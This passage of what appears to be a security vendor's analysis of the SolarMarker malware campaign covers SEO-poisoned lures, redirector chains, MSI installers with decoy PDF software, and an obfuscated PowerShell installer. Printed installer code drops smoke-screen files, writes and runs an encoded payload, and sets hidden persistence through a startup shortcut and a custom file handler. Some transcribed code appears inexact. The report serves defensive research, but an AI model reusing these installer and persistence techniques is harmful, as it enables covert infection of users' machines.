or consider declaration...                           |\n  | Will of Others Corp Medical - [WillCorpMed] It is pressed as extensive collections of all holders across...                                |\n```\n\nThe comments themselves have no content other than what appears to be links to PDF files, as in the following example:\n\n```image\nAlt: Groups SolarMarker\nDescription: The image displays a screenshot of a Google Groups discussion titled 'Variable Length File Declaration In Cobol'. It shows a post by a user named 'harith Zahran' with the visible content indicating a link to download a PDF file. The download button is prominently featured with a red arrow pointing downwards, suggesting the action of downloading. The Google Groups interface is visible, including the navigation menu and user information. The image serves as an example of how attackers use fake discussions to distribute malicious links.\n```\n\nHowever, the disguised link leads to a redirection site (**hxxps://abocomteamsd[.]site/Variable-Length-File-Declaration-In-Cobol**), which is only the next element in the download chain:\n\n```\n<a href=\"hxxps://abocomteamsd[.]site/Variable-Length-File-Declaration-In-Cobol\" target=\"_blank\" rel=\"nofollow\" data-saferedirecturl=\"hxxps://www.google.com/url?hl=hu&amp;q=hxxps://abocomteamsd[.]site/Variable-Length-File-Declaration-In-Cobol&amp;source=gmail&amp;ust=1636557011760000&amp;usg=AFQjCNGBOEcF9QaTJVv6GoQFs_cbKH1yYw\"><img alt=\"OEyQtsI7nXS.jpg\" width=\"550px\" height=\"162px\" src=\"hxxps://groups[.]google.com/group/8pxafs/attach/3612f6b957d5d/OEyQtsI7nXS.jpg?part=0.1&amp;view=1\" data-iml=\"3609\"></a>\n```\n\nIt’s likely that this distribution method was from an older campaign. While the links still resolved as we prepared our analysis, they returned a zero-length response—indicating no content remained at the destination. However, we were able to collect the keywords from the group posts to analyze the search terms the criminals behind the campaign were attempting to poison. The word cloud below displays the frequency of keywords in those search terms:\n\n```image\nAlt: Search Terms SolarMarker\nDescription: The image is a word cloud displaying various keywords related to documents and requests, such as 'agreement,' 'contract,' 'form,' 'letter,' and 'template.' The size of each word indicates its frequency, with larger words appearing more frequently in the context analyzed. This visual representation highlights the common search terms targeted in the SolarMarker campaign, suggesting a broad phishing strategy aimed at capturing a wide range of user interests.\nTranscription: agreement application assurance best ca certificate checklist complaints consent contract county death direct document examples form guidance guide handbook instructions insurance invoice job law lien management medical modification mortgage notice offer pdf penalty plan present property protocol questionnaire recommendation reference renewal rental report request requirements resume sale sample satisfaction schedule school services spreadsheet state statement statutory table tax template term transcript types university worksheet\n```\n\nThis aligns with the statistics gathered from the MSI installers, showing the efficiency of the method. It also shows that the criminals were not particularly picky about their chosen search terms—they cast a wide net, aiming for many target interests and potential target types.\n\n### SEO Method 2: PDF implants\n\nIn another set of lures, the initial deceptive content used for SEO is stored in PDF files hosted on websites; the search engines linked to the PDF files themselves directly as a result of the malicious SEO efforts.\n\nIn most of the cases, compromised WordPress sites were used to host PDF files, specifically in the **wp-content/uploads/formidable** directories on those websites. In other cases, the same PDF content was stored in an Amazon cloud site, or a CDN site.\n\nWhen the link in the search engine is clicked, the web browser opens the malicious PDFs as it would any other PDF document on the web. The actual content of these malicious PDFs is limited to the text of the targeted search term and two download buttons —one for the PDF component, the other for DOC:\n\n```image\nAlt: PDF SolarMarker\nDescription: The image depicts a PDF document titled 'Variable Length File Declaration In Cobol'. It features two download buttons labeled 'PDF' and 'DOC', suggesting that users can select between two formats for downloading content. The background of the PDF includes a collage of images, while the main text is presented in a clear, central layout. The bottom right corner displays the logo of SOPHOSlabs, indicating the source of the content.\nTranscription: |\n  Variable Length File Declaration In Cobol\n  \n  Select Download Format:\n  \n  [PDF Download Button] [DOC Download Button]\n  \n  [SOPHOSlabs Logo]\n```\n\nThe corresponding code in the PDF file source links these buttons to a distribution site, hxxps://sseiatca[.]site:\n\n```\n/Annots [<< /Type /Annot /Subtype /Link /Rect [22.00 472.00 288.00 393.00] /Border [0 0 0] /A << /S /URI /URI (hxxps://sseiatca[.]site/Variable-Length-File-Declaration-In-Cobol/pdf/sitedomen/7|29279|5|1|1|1)>> << /Type /Annot /Subtype /Link /Rect [302.00 457.00 548.00 384.00] /Border [0 0 0] /A << /S /URI /URI (hxxps://sseiatca[.]site/Variable-Length-File-Declaration-In-Cobol/doc/sitedomen/7|29279|5|1|1|1)>>]\n```\n\n### SEO Method 3: deceptive web pages\n\nThis method also uses compromised WordPress sites to deliver the content, but instead uses HTML pages hosted on the compromised site. The HTML source for these malicious pages contain link collections for other search terms, all connected to other malicious pages on the same compromised server, as part of the mechanism behind the fraudulent SEO campaign:\n\n```image\nAlt: SEO Mal Content\nDescription: The image depicts a snippet of HTML code likely extracted from a compromised website. It shows a list of menu items with links that appear to be related to various topics or files, including forms, electronic signing software, and document recommendations. The structure includes classes associated with menu items, indicating a potential framework or content management system being exploited.\nTranscription: |\n  <li id=\"menu-item-29\" class=\"menu-item menu-item-type-post_type menu-item-object-page menu-item-29\"><a href=\"/forms-google-com-spreadsheet\">Forms Google Com Spreadsheet</a></li>\n  <li id=\"menu-item-6869\" class=\"menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-6869\"><a href=\"/best-way-to-level-summoners-war\">Best Way To Level Summoners War</a>\n  <ul class=\"sub-menu\">\n      <li id=\"menu-item-6868\" class=\"menu-item menu-item-type-post_type menu-item-object-page menu-item-6868\"><a href=\"/best-electronic-document-signing-software\">Best Electronic Document Signing Software</a></li>\n      <li id=\"menu-item-37\" class=\"menu-item menu-item-type-post_type menu-item-object-page menu-item-37\"><a href=\"/lecture-note-on-road-construction-quantity-estimation\">Lecture Note On Road Construction Quantity Estimation</a></li>\n  </ul>\n  </li>\n  <li id=\"menu-item-38\" class=\"menu-item menu-item-type-post_type menu-item-object-page menu-item-38\"><a href=\"/wood-table-black-chairs\">Wood Table Black Chairs</a></li>\n  <li id=\"menu-item-138\" class=\"menu-item menu-item-type-post_type menu-item-object-page menu-item-138\"><a href=\"/small-business-laptop-recommendations\">Small Business Laptop Recommendations</a></li>\n  <li id=\"menu-item-239\" class=\"menu-item menu-item-type-post_type menu-item-object-page menu-item-239\"><a href=\"/ejemplo-diseo-instruccion-modelo-asegure\">Ejemplo Diseño Instruccional Modelo Asegure</a></li>\n  <li id=\"menu-item-6867\" class=\"menu-item menu-item-type-post_type menu-item-object-page menu-item-6867\"><a href=\"/junior-sql-developer-resume-sample\">Junior Sql Developer Resume Sample</a></li>\n```\n\nAlso, the pages have a visible string **PdfDocDownloadsPanel** at the beginning of the page, which is a common characteristic of this campaign (previously observed in earlier SolarMarker campaigns):\n\n```image\nAlt: Deceptive Site SolarMarker\nDescription: The image displays a deceptive web page used in the SolarMarker campaign. At the top, the visible string 'PdfDocDownloadsPanel' is highlighted in red, indicating its significance. Below, details about a document titled 'Variable Length File Declaration In Cobol' are presented, including its filesize and upload date. Two download buttons are provided for PDF and DOC formats, suggesting an attempt to lure users into downloading potentially malicious files. Additional text promotes 'unlimited access' to various digital content, further emphasizing the page's deceptive nature.\nTranscription: |\n  PdfDocDownloadsPanel\n  \n  Variable Length File Declaration In Cobol\n  Filesize: 831 Kb\n  Uploaded: July 18 2020\n  \n  Select download format:\n  [Download PDF] [Download DOC]\n  * Download files without registration\n  \n  UNLIMITED ACCESS\n  \n  Experience unlimited games, music, books, movies and more from our comprehensive library..\n```\n\nThe marker string is also clearly visible in the HTML code:\n\n```\n<span class=\"logo-text\">PdfDocDownloadsPanel</span>\n```\n\nBoth of the download buttons on this page advertise different file formats for a download, instead direct to two separate redirectors on **hxxps://passesleeson[.]site**, using /doc and /pdf in the URL to further bait the click.\n\n```\n<h1 class=\"content__caption\">Variable Length File Declaration In Cobol</h1>\n<p class=\"content__caption\" style=\" font-size: 16px;\">Filesize: 831 Kb</p>\n<p class=\"content__caption\" style=\" font-size: 16px;\">Uploaded: July 18 2020</p>\n<br><p class=\"content__caption\" style=\" font-size: 16px;\">Select download format:</p>\n<br><a href=\"hxxps://passesleeson[.]site/pdf/Variable-Length-File-Declaration-In-Cobol\" class=\"button7\">Download PDF</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"hxxps://passesleeson[.]site/doc/Variable-Length-File-Declaration-In-Cobol\" class=\"button7\">Download DOC</a>\n```\n\n### Redirectors\n\nIn each of the three SEO baiting methods discussed above, the download links all connect to sites with the **.site** top-level domain (TLD). In the recent campaigns we have seen about 100 **.site** domains used. Typically the URLs referring to this site look like this:\n\n```\nhxxps://triplegnuise[.]site/Clinical-Correlation-Recommended-After-Stress-Test/pdf/sitedomen/3\n```\n\nThe numeric parameter at the end original URL (/3 in this example) is irrelevant. Any number can be put in its place, and the returned content will be similar: a dynamically-created HTML redirect code using a domain selected at random from a large pool of second-stage redirector sites (in the case below, chargraman[.]ml). Each time the link is requested, a different next-stage domain is provided.\n\n```\n<meta http-equiv=\"refresh\" content=\"0;URL=hxxps://chargraman[.]ml/22b0270b0a7e4dd147bc74ec3b799366/Clinical-Correlation-Recommended-After-Stress-Test/650845767/pdf\">\n```\n\nWhile the example above uses the .ml TLD, the majority of the second-stage redirects in these campaigns used the **.tk** TLD. In the recent campaigns we have seen about 3000 domains used, of which more than 2000 were .tk domains (with the remainder relatively evenly spread across the .ga, .ml, .cf and .gq TLDs).\n\nThe second-stage redirect URLs contain the search term used as bait, and return an HTTP response code 302 to redirect to the final destination server.\n\nThe downloads all point to **pdfdocdownloadspanel[.]site**, which hosted phishing content since at least 2019. The site has been shut down, so we were unable to retrieve a live version of the target page, but from telemetry from known cases we know that the next part of the infection chain is the download of an MSI installer carrying a decoy PDF viewer. So there should be a misleading link in between offering the installer based on telemetry associated with the malware.\n\n### The installer\n\n```image\nAlt: Flow Path SolarMarker\nDescription: The image is a detailed flowchart illustrating the actions and interactions involved in the SolarMarker malware campaign. It features various nodes representing processes like 'PowerShell installer' and 'MSI installation', as well as files involved, such as 'good-choice-bad-choice-worksheets-for-kids.msi' and 'pdfelement-pro_setup_full5239.exe'. The nodes are interconnected with lines showing data flow and interactions, and labels highlight key components and actions, such as 'Hijacked search' and 'Reflective payload loading'. The overall structure represents the complexity of the malware installation and execution process.\nTranscription: |\n  SOPHOSLABS\n  \n  Reflective payload loading\n  %APPDATA%\\idobgtnwzukgrofeninfehtkayhztyosjfmoeaduge\n  %APPDATA%\\idobgtnwzukgrofeninftakyyhyoquzlsn.dgbregjoecclpbnftrd\n  %APPDATA%\\idobgtnwzukgrofeninpfjtkhygcoqvlsz.lopnbhviavcinkufz\n  %APPDATA%\\idobgtnwzukgrofeninbzihtycjzuh.nhjervsghgec\n  %APPDATA%\\idobgtnwzukgrofeninmcaxywdt.yohpnzhtfdxk\n  %APPDATA%\\idobgtnwzukgrofeninpbslkvmhjdjbc.lcothwsgojbmuhg\n  %APPDATA%\\idobgtnwzukgrofenisvrxplnebgadpu.owgrgariyf\n  \n  PowerShell installer\n  msiexec.exe\n  Decoy: pdfelement-pro_setup_full5239.exe\n  good-choice-bad-choice-worksheets-for-kids.msi\n  Hijacked search\n```\n\nThe installer file dropped by the download link is named to match the search string that delivered it. In the example above, for instance, the file is named **good-choice-bad-choice-worksheet-for-kids.msi**. When the installer is opened, it executes a decoy setup application (in this case, **pdfelement-pro_setup_full5239.exe**), while also executing a PowerShell script (**p.ps1** or **InstallScript.ps1**).\n\nThe installers require a 64-bit windows. They were generated by the EMCO MSI package builder and contain a pre-installation script. This script prepares and executes the PowerShell installer, while executing the decoy installer.\n\nThe typical malware distribution packages look like this:\n\n```image\nAlt: MSI SolarMarker Package\nDescription: The image displays a screenshot of the EMCO MSI Package Builder interface, showing the file system structure of a specific MSI package named 'Hair-Salon-Income-Statement.msi'. On the left side, the project tree highlights various components including folders and files related to the installation package. The right side lists details of the files, including their paths, sizes (e.g., 'dist-x86.exe' at 1,224,992 bytes and 'InstallScript.ps1' at 83,076 bytes), and attributes. This serves as an informative visualization of the contents and structure of the MSI installer related to the SolarMarker campaign.\nTranscription: |\n  File System\n  Creator: Hair-Salon-Income-Statement.msi\n  Path                                        Size       Attributes\n  ------------------------------------------------------------------\n  AppDataFolder                               ------\n  CurrentUserProfileFolder                    ------\n  AppDataFolder\\dist-x86.exe                  1,224,992  ------\n  CurrentUserProfileFolder\\InstallScript.ps1  83,076     ------\n```\n\nIt contains two files, the decoy executable (dist-x86.exe in this case) and the installer PowerShell script (InstallScript.ps1 in this case). Additionally, two installation actions are defined: the first executes powershell.exe with the script to execute the extracted main install script, while the second launches the decoy executable (dist-x86.exe in this case).\n\n```image\nAlt: Actions Polazert MSI\nDescription: The image displays a screenshot from a software interface, showing the 'Pre & Post Actions' section of a project setup related to malware installation processes. It lists two custom actions: the first executes a PowerShell command with a bypass for the execution policy, and the second runs an executable located in the user's AppData folder. The layout indicates a technical environment, likely used for creating or analyzing MSI installers.\nTranscription: |\n  Pre & Post Actions\n  ------------------\n  | # | Name     | Command    | Parameters                                                                                                          |\n  | - | -------- | ---------- | ------------------------------------------------------------------------------------------------------------------- |\n  | 1 | Action   | powershell | -ExecutionPolicy bypass -command \"text([IO.File]::ReadAllText('${CurrentUserProfileFolder}\\${installScript.ps1}'))\" |\n  | 2 | Action 1 |            | ${AppDataFolder}\\dist-x86.exe                                                                                       |\n  \n  System Actions\n  -------------------------------------------------\n  There are no system actions to show in this view.\n```\n\nThe most recent scripts we found added a twist to this. In these samples, the PowerShell installer file in the archive is encoded as a base64 string, which is also additionally encrypted:\n\n```\naiQOei85cQpkRGJeQQZSIFV+K1x/cHMGaxVtRSVgb187BwoyEQwwDi4mPycmIytdKh03CRozJQUCAC4OMxgdPTw0M\nxYCHS0rHhwMNwwNNRgSABgzERQuJSQlJBk1NzgXKiBMGRYWIyIDECENAA0IOGQhBSYUD1wNVSV8OXsNLyY5EwM\nUCw5iLDQGJRkLJj8XMxgaPTIzKFkQFgY/ARQ+GwQzKSkHRB4HMDYBdTEPGz4GMDkWDyM6RQYXEEAjPwwxFFEwJS\n00HSkTLzheBRUJSQUAMnAvbHFfHyUjAyYlXDYyexsNAQQMIQxHKTMQAmMBJCIYFws2ICQ1GDsHPTABFh4/ASwDEFI\nvHDIQIBwiNBsiJR0GNQ0HIC0NDDMIGRcAHwEDABI/JS8SCyw+MTcrJSoLHl8gFiwjG3U5EQAQKhwFHw0IOFAjFCA4cD\ngaeToSDDIPMRQSNQIVFi4fFDY4EDoYNyoRMjsaEjoBIhwAG3EeDAwlH0MtDyAOJDIwISU7Fg8mMD4vaCcVOSIuJBQ6D\nxwmGjwtQCckFCMdOCYHHg0ddjkzKWgUNzVHFScnJz83P3kiGwJ4fywXIw84EQIYGSc5JgYkJxplMyZAPBIvOw8eBiw\nCA3VaFgMQJgUcRi8mJlIwdAMdORkZJAQMPiEDRx9kCD4+BSINCTYOBC4ZAR4RMhUdCS\n```\n\nIn these samples the installation script is slightly more complicated, it also performs a decryption of the PowerShell installer first:\n\n```image\nAlt: New Polazert Preinstall Actions\nDescription: The image displays a detailed overview of pre and post-installation actions in an MSI package related to the SolarMarker campaign. It includes a table listing two actions: 'Soft' which executes a decoy installer, and 'Stager' which runs a PowerShell command. The PowerShell command is designed to execute a script while bypassing certain security features. This serves to illustrate the technical steps involved in the installation process of the malware, providing insight into the tactics used by the SolarMarker campaign.\nTranscription: |\n  Pre & Post Actions\n  ------------------\n  | Name   | Command                                             | Parameters                                                                                                                                                                          |\n  | ------ | --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | Soft   | ${AppDataFolder}\\$pdfelement-pro_setup_full5239.exe |                                                                                                                                                                                     |\n  | Stager | powershell                                          | -ep bypass -windowstyle hidden -command \"$xp='${AppDataFolder}\\$pd.log';$k='NEkCMXBoQtWiubeAfKIlH...';$b=[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($xp));... |\n```\n\nA handful of MSI installers were “traditional” MSI files, but they also contained custom action scripts:\n\n```image\nAlt: Trad MSI Polazert Action\nDescription: The image shows a screenshot from a software installation tool, highlighting a section labeled 'Custom Actions'. It displays various actions such as 'CallFunctionFromDLL', 'PowerShellScriptInline', and 'StopProcess'. The properties pane on the right details an attached DLL file and a specific function called 'RunPowerShellScript'. Notably, it features a red-highlighted section labeled 'Action data' that includes what appears to be an encoded string. This context suggests that the image is part of a technical analysis of a malware installer, specifically relating to how it integrates PowerShell scripts during installation.\nTranscription: |\n  Custom Actions\n  ---------------\n  Add Custom Action\n  Existing Custom Actions\n  -----------------------\n  - CallFunctionFromDLL\n  - nitro_pro13.exe\n  - PowerShellScriptInline\n  - StopProcess\n  - wrkfx.dat\n  (This list contains already existing custom actions, like the ones launched by controls on the installation wizard.)\n  \n  Installation Sequence\n  ---------------------\n  Show: All | Install | Uninstall | Maintenance\n  \n  Wizard Dialogs Stage\n  ---------------------\n  - nitro_pro13.exe\n  - PowerShellScriptInline\n  - StopProcess\n  - CallFunctionFromDLL\n  - PrepareDlg\n  - Searches\n  \n  Properties\n  ----------\n  Attached DLL:  :\\Temp\\MS167D8.tmp\\Nitro Pro 13 13.2.1.1\\Binary\\powershellscriptlauncher.dll\n  Function: RunPowerShellScript\n  Action data: $a19147da46143c816881e98291a6f='HBLGeWdWNWQ1VqSRCN+AyTIFYbE5nC'\n  \n  Execution Time\n  ---------------\n  - Immediately\n  - When the system is being modified (deferred)\n  - During installation rollback\n  - After the system has been successfully modified (commit)\n  \n  Execution Options\n  -----------------\n  - Run under the LocalSystem account with full privileges (no impersonation)\n```\n\nIn this case the custom action script contained the PowerShell installer:\n\n```image\nAlt: PowerShell Installer Action\nDescription: The image is a screenshot of a PowerShell script related to the SolarMarker campaign. It includes code snippets that demonstrate the use of various PowerShell commands and parameters. The script seems to involve generating random bytes, creating COM objects, and executing specific functions, indicative of malware installation tactics. Additionally, it showcases the use of parameters for script execution, including aliases for file handling and argument passing.\nTranscription: |\n  DigitallySignScript\n  $a19147da46143c816881e98291a6f='HBLGwdWNVVQa1Vvq5RCN+AyT1FYbE5nC2paQWRuIViRjSVVjNnd1FGTjNVM1BZkhaRj'\n  New-ObjEcT BYTE[] = (gEt-RanDOM -mTminum 50000 -MaxImuM 200000);(New-ObjEcT RAnDOM).nextTByTes($a)\n  $a7a25b84a4415a162be6516f7e3=New-object -cOMObject wsCrIPt.SHELL;$a10a868fbda412b8d4adecbb7022.Save();IEx $afd57e16804db817580e409968;\n  \n  SOHScriptPreamble\n  param(\n      [Alias(\"propFile\")]\n      [Parameter(Mandatory=$true)]\n      [string] $miPropOutFilePath,\n  \n      [Alias(\"scriptFile\")]\n      [Parameter(Mandatory=$true)]\n      [string] $miPropKVScriptFilePath,\n  \n      [Alias(\"scriptArgsFile\")]\n      [Parameter(Mandatory=$true)]\n      [string] $userScriptFilePath,\n  \n      [Parameter(Mandatory=$false)]\n      [string] $userScriptArgsFile,\n  \n      [string] $testPrefix\n  )\n  $isTest\n```\n\n### Decoy\n\nThe decoy is a legit installer for Wondershare PDFelement, likely to complete the decoy social engineering process.\n\n```image\nAlt: Wondershare\nDescription: The image depicts the installer interface for Wondershare PDFelement. It features a prominent logo of Wondershare at the top, with a blue background. Below the logo, there is an 'Install' button, and a disclaimer stating that by clicking 'Install', users agree to the Privacy Policy and EULA. The bottom left corner displays 'SOPHOSlabs', indicating the image's source or analysis context.\nTranscription: |\n  Wondershare PDFelement\n  \n  By clicking \"Install\", you agree to the Privacy Policy and EULA.\n  \n  [Install Button]\n  \n  SOPHOSlabs\n```\n\nSome of the newest MSI installers have a different decoy: Adobe Acrobat Pro DC Installer. Because it is an outdated version, on execution it will offer to download the latest version:\n\n```image\nAlt: Adobe Installer\nDescription: The image displays a Software Installer window for Adobe Acrobat Pro DC. It informs the user that they are using an outdated version of the installer and prompts them to click 'Finish' to download the latest version. The window is branded with the Sophos labs logo, indicating its relevance to cybersecurity.\nTranscription: |\n  Adobe Acrobat Pro DC Installer\n  \n  You are using an older version of the AcrobatDC installer, or you are using a renamed file. Click Finish to get the latest installer.\n  \n  [SOPHOSlabs]\n  [Finish]\n```\n\n### PowerShell malware installer\n\nThe PowerShell installer does the actual malware deployment, creating the files and registry keys that establish persistence for the backdoor.\n\nThe script contains the actual malware payload (in base64-encoded and encrypted form) in a string variable at the top of the script. In addition to the payload definition, the beginning of the script also sets two defined functions—one to create random file and directory names for the malware, and another to create a path for a new Windows registry entry.\n\nThe script calls these functions as it steps through the installation steps, labeled in red in the screenshot below:\n\n```image\nAlt: PowerShell Installer Polazert Code\nDescription: The image is a screenshot of a PowerShell script that serves as a malware installer. The script includes sections of base64-encoded and encrypted payloads, indicated with annotations. Functions for creating random file and directory names, as well as setting up Windows registry entries, are highlighted in red. The script's purpose is to deploy malware while establishing persistence through registry modifications and creating files with random data. The overall structure and comments within the code provide insights into its functionality and intent.\nTranscription: |\n  $ae806d02a214229@db5aaaFb0b11c = \"FTGobGZWcGVQMZV...\"\n  \n  $saa93eef7e5545ba82155358556317 = \"$\"+\"ab335ab62c0406ba430196dbf299d=add-type -mEMBErdeFinitioN ('['+'d'.TOUPper()+'L1'.TOLoweR()\n  .TolowER()) -nAME ('w'.toUpper()+'In32'.toLoWer()+'s'.tOUpPeR()+'How'.TOLOWER()+'W'.tOuPPEr()+'INdOw'.toLOWER()+'A'.touppER()+\n  '\"+\"ab335ab62c0406ba430196dbF299d: :ShOwwINDOwasYnc((gEt-PROCESS -iD $\"+\"pID).MaInwinDowHandle, 0)\"\n  \n  iex $saa93eef7e5545ba82155358556317\n  \n  Function a48fdf325964f7a9c3a04b7868140 {\n      RETURN -join (0..(10..30) | get-random) | %{[CHAR]((65..90) + (97..122) | geT-rAndom)})}\n  \n  Function aab278067df468969ba1a8617e48e {\n      param($a36edecaac94369a466f733566aa3, $a1f6656ae834bfb795f0a7beeaa)\n      if (-NOT (TEST-pATh \"regISTRY::$a36edecaac94369a466f733566aa3\".toLoweR())) {\n          NEW-ITem -PatH \"regISTRY::$a36edecaac94369a466f733566aa3\"\n          SEt-ITEm -pAth \"regISTRY::$a36edecaac94369a466f733566aa3\".toLOWer() -VALUE $a1f6656ae834bfb795f0a7beeaa\n      }\n  }\n  \n  $a635320828d4a2955c116423ca252 = (a48fdf325964f7a9c3a04b7868140)\n  $a69c707c68443f97cb794c99cd326 = (a48fdf325964f7a9c3a04b7868140)\n  $a284ef1efe2492be724b2460dd9eb = (a48fdf325964f7a9c3a04b7868140)\n  \n  $senv = \"$env:appData\\\\Ad\"+\"ob\"+\"e\\\\\"+(a48fdf325964f7a9c3a04b7868140)\n  \n  NEW-ITem -itemtyPE diReCToRy -FORCe -Path $senv\n  \n  # Create smoke screen files\n  $a2fbfb531b84f2bcde716227e8f92 = GET-RANDOM -mINImuM 100 -mAximum 300\n  for ($i = 0; $i -lt $a2fbfb531b84f2bcde716227e8f92; $i++) {\n      $filepath = $senv + '\\\\' + $i + '.tmp'\n      New-Item -Path $filepath -ItemType File\n  }\n  \n  # Create payload\n  $encryptedPayload = \"...\" # (truncated for brevity)\n  [System.IO.File]::WriteAllBytes(\"$senv\\\\payload.exe\", [System.Convert]::FromBase64String($encryptedPayload))\n  \n  $process = Start-Process \"$senv\\\\payload.exe\" -PassThru\n  $process.WaitForExit()\n```\n\nIn some of the samples we examined, the installer scripts end with the comment line:\n\n```\n#Hello for Squiblydoo\n```\n\nThis is likely in tribute to the malware blog that investigated the installation method used in attacks documented in early 2021.\n\n### Persistence with a smoke screen\n\nThe installer creates persistence for the malware by creating a .LNK file in the affected system’s startup directory. But instead of pointing to an executable file, this link points to a junk-filled “smoke screen” file with a randomly-created file name and extension. The actual execution method for the malware is included in script for a custom file handler created for a file type defined by this random extension—defined by the installer script in the Windows registry. The commands in the handler’s script decrypt and execute the actual payload, hidden amongst the random files.\n\nThe first part of the installer script following the encrypted payload uses the random name function to create a directory to drop the payload into. The randomly-named folder is created in the path **%APPDATA%\\AdobE**. The installer script also creates an LNK file in the %STARTUP% directory to establish persistence—though not in the way one would expect, as we’ll explain shortly.\n\nNext, the script deploys a “smoke screen” of anywhere from 100 to 300 files, dropping them in the randomly-named directory. With a single exception, these are all files filled with random junk. One file dropped in the same location, however, contains the encrypted payload.\n\n```image\nAlt: Smokescreen Files Polazert\nDescription: The image depicts a file directory on a Windows operating system, specifically showing the contents of the **%APPDATA%\\AdobE** folder. The folder contains several files with random and nonsensical names, which are likely part of the SolarMarker malware campaign's 'smokescreen' tactic. This tactic involves dropping numerous junk files to obscure the actual malicious payload within the system. The files are displayed with details such as their names, modification dates, types, and sizes, indicating an array of random data files, supporting the context of the malware's persistence method.\nTranscription: |\n  | Name                          | Date modified | Type             | Size   |\n  |-------------------------------|---------------|------------------|--------|\n  | dAwVYhYjPjHMSChTqYcVkdSPNklv  | 03/11/2021    | RTYQVKDPSNFKY... | 52 KB  |\n  | AENCRfHImGJgFqMPRkZVDqjvKjUR  | 03/11/2021    | VDAIVKQFJZK...   | 62 KB  |\n  | ATrkVhOZkYDAZgFqMPRkZVqkPjUR  | 03/11/2021    | ZDLVIKNQFJZK...  | 64 KB  |\n  | BNdYgVYhMZgYqFqMPRkZVkdSPNklv | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | BcBEOhYjPjHMSChTqYcVkdSPNklv  | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n  | DgTjKjMZgYqFqMPRkZVkdSPNklv   | 03/11/2021    | YVREHUKMZK...    | 116 KB |\n```\n\nThe LNK file (in this case, with the file name **a06f383e63a43381f156ee77d9f6f.lNk**) points to one of these files (**VUPQVfERpBWfmEvrhLOSNZ.NuAoeLuriIQZNSVqcO**):\n\n```image\nAlt: LNK File Polazert\nDescription: The image displays a screenshot from a system registry tool showing the autorun entries in a Windows environment. It lists various entries under the registry path related to the current version of Windows, focusing on the persistent malware entry. The prominent entry is a .LNK file named 'a06f383e6343381f156ee77d9f6f.lNk,' located in the user's startup directory, which points to a file in a random folder under the %APPDATA% path. Other entries are related to legitimate applications like 'BCSsync' and 'VBoxTray,' indicating potential malicious persistence through the LNK file.\nTranscription: |\n  Autorun Entry                     Descr...  P Image Path\n  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n  BCSSync                          Micro...  M:\\program files\\microsoft office\\office14\\bcssync.exe\n  VBoxTray                         Virtu...  C:\\windows\\system32\\vboxtray.exe\n  C:\\Users\\                        \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n                                   a06f383e6343381f156ee77d9f6f.lNk\n                                   C:\\user\\appdata\\roaming\\adobe\\ycdpxehjwgoxk\\vuPQvferpbwfmevrhLOSNZ.nuaoeluriiqznsvqco\n```\n\nNormally, one would expect this linked file to be an executable or script file. But for these SolarMarker campaigns the linked file is one of the random junk files, and cannot be executed itself.\n\n```image\nAlt: Garbage Smokescreen File Polazert\nDescription: The image displays a hex view of a file named 'VUPQVfERpBWfmEvrhLOSNZ.NuAoeLuriIQZNSVqcO' in a hex editor (Far 3.0.4040 x86). The hex editor presents the file's binary content, showing both the hexadecimal values on the left and the corresponding ASCII representation on the right. This format is commonly used to analyze file contents for malware investigation or digital forensics, highlighting the significance of the file's structure over its actual data.\nTranscription: |\n  view VUPQVfERpBWfmEvrhLOSNZ.NuAoeLuriIQZNSVqcO h 1252 96115\n  000000000: 06 69 D7 F1 D8 71 A7 06 B7 16 2E 67 00 3E EB\n  000000010: 86 F9 24 33 A6 27 AE 6D E9 6E D6 B5 10 2F F0\n  000000020: 70 26 F3 FB 75 68 D7 00 02 B8 08 68 EB DE\n  000000030: 74 9E 94 07 3B 86 BE DE 81 D7 BD 41 3C 43 75 11\n  000000050: B7 D6 41 50 9B 8D B3 EA 00 06 06 45 C6 76 C4\n  000000060: 0A 20 C9 C7 C4 76 76 76 76 76 76 76 76 76 76\n  000000070: 0F 20 C9 C7 A1 FC D2 C0 00 00 00 00 00 00 00\n  000000080: DE 6B 6A E2 4C 78 5F CC FB 51 A8 D9 70 9F 5B\n  000000090: 3E 79 98 98 FF C2 46 96\n```\n\nAs it turns out, the content of the file is totally irrelevant. What is important is the unique and random file extension, that was used: **.NuAoeLuriIQZNSVqcO**.\n\nAfter dropping the files, the PowerShell installer registers the file extension used for them as a custom file type with a randomly generated name (in this case **ocrrhvyczvnikxofwntsvx**):\n\n```image\nAlt: Polazert Custom Handler Reg\nDescription: The image shows a screenshot of a Windows Registry Editor displaying a custom file type created by malware. In the left pane, the path 'Computer\\HKEY_CLASSES_ROOT\\.nuaoeluriqznsvqco' is highlighted, indicating a randomly generated file extension. The right pane shows the default value of this key, which is set to 'ocrrhvyczvnikxofwntsvx', representing a custom file open handler. This visual aids in understanding how the SolarMarker 